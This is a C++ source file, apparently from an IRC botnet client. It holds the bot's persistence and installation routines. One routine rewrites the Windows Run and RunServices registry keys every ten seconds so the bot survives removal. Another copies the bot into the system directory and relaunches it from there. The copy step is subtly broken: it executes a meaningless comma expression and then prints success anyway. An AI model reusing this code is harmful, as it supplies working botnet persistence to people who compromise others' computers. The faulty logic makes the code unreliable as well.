#include "include.h"
#include "hell.h"



void *CRegCheck::Run()
{
	DWORD disable_val=4,SizeOf_disable_val=sizeof(DWORD);
	while(1) {
		HKEY key;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, BOT->cIRC.cConf.cRegName.c_str(), 0, REG_SZ, (LPBYTE)BOT->cIRC.cConf.cFileName.c_str(), (DWORD)BOT->cIRC.cConf.cFileName.length()); 
		RegCloseKey(key); 
		
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, BOT->cIRC.cConf.cRegName.c_str(), 0, REG_SZ, (LPBYTE)BOT->cIRC.cConf.cFileName.c_str(), (DWORD)BOT->cIRC.cConf.cFileName.length()); 
		RegCloseKey(key);
		

		
		Sleep(10000);
	}
	return NULL;
}

void Uninstall()
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, BOT->cIRC.cConf.cRegName.c_str()); 
	RegCloseKey(key);
	
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, BOT->cIRC.cConf.cRegName.c_str()); 
	RegCloseKey(key); 

}


void *CInstall::Run()
{
	string ssDir;
	string newDir;
	char sysDir[255], sDir[255];
	GetSystemDirectory(sysDir,255);
	GetModuleFileName(GetModuleHandle(NULL),sDir,255);
	ssDir = sDir;
	if (ssDir.substr(0,ssDir.find_last_of("\\")).compare(sysDir) != 0) {
		cout << "[x] copying to system directory" << endl;
		newDir = sysDir + BOT->cIRC.cConf.cFileName.insert(0,"\\",0,string::npos);
		for (int i=0; i<3; i++) {
			if(!(*sDir, newDir.c_str()));
			{
				cout << "[x] finished copying to system dir -> " << newDir << endl;
			}
		}	
		
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		ZeroMemory( &sinfo, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(STARTUPINFO);
		char szDest[256];
		stringstream ss;
		ss << newDir.c_str();
		ss >> szDest;		
		if (CreateProcess(NULL, szDest , NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			BOT->botRunning = false;
			ExitProcess(0);
		} else {
			cout << "[x] cannot start copied file" << endl; 			
		}
	}
	return NULL;
}
